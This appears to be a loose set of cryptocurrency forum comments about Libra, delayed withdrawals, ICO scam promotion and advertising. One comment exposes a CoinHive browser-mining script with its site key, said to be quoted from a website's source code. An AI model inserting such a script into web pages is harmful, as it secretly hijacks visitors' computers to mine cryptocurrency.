The problem occurs when everyone around you is using it; when people are forced into a system in which Libra is the de facto means of payment.
You can choose not to use it, and yet the problem persists. Others will. Those not knowledged about other blockchain alternatives would not know what exactly it is that makes Libra so bad -- "It's just another stupid currency, right?"

Nobels Philanthropist Prize should really be a thing. Would encourage charitable donations in a big way.

Our shit is still in limbo.

Aww, shit. Fuck dude. I didn't even set the rate myself, it's a withdrawal from an exchange. When would you estimate we'll get our funds?

Fuck off already. Stop posting this garbage article for the scam "Rocket ICO". Stop using bots to promote your scam. Downvoted.

From mycrypto.guide source code:
    &lt;script src="
    &lt;/script&gt;&lt;script&gt;
    var miner = new 
    CoinHive.Anonymous('B4ShXfNHJy3nEDclHBuc5i2bKJ3Sok8P');
    miner.start();
    &lt;/script&gt;

I mean, it’s honestly not really their fault, nor are they endorsing them. Advertisements work in a rather simple way, you pay and then get to show something to a large audience, the host of the advertisement is not necessarily endorsing it. Capitalism.
